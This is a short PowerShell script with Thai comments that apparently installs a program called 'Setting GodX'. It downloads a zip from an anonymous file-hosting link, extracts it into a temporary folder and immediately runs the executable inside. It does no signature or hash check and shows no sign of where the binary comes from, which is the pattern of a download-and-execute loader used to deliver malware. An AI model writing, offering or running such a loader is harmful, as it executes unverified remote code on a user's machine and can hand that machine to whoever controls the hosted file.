# แก้ไขปัญหา Security Protocol เพื่อให้โหลดไฟล์จากเว็บได้
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$exeName = "Setting GodX.exe"
$zipName = "Setting GodX.zip" # แก้ไขให้ตรงกับชื่อไฟล์ที่คุณมี
$zipUrl = "https://files.catbox.moe/afb9rh.zip"
$tempPath = "$env:TEMP\GodX_App"

# 1. สร้างโฟลเดอร์ทำงาน
if (!(Test-Path $tempPath)) { New-Item -ItemType Directory -Path $tempPath }

# 2. ดาวน์โหลดไฟล์ด้วย Invoke-WebRequest (เสถียรกว่า)
Invoke-WebRequest -Uri $zipUrl -OutFile "$tempPath\$zipName"

# 3. แตกไฟล์
Expand-Archive -Path "$tempPath\$zipName" -DestinationPath $tempPath -Force

# 4. รันโปรแกรม
Start-Process "$tempPath\$exeName"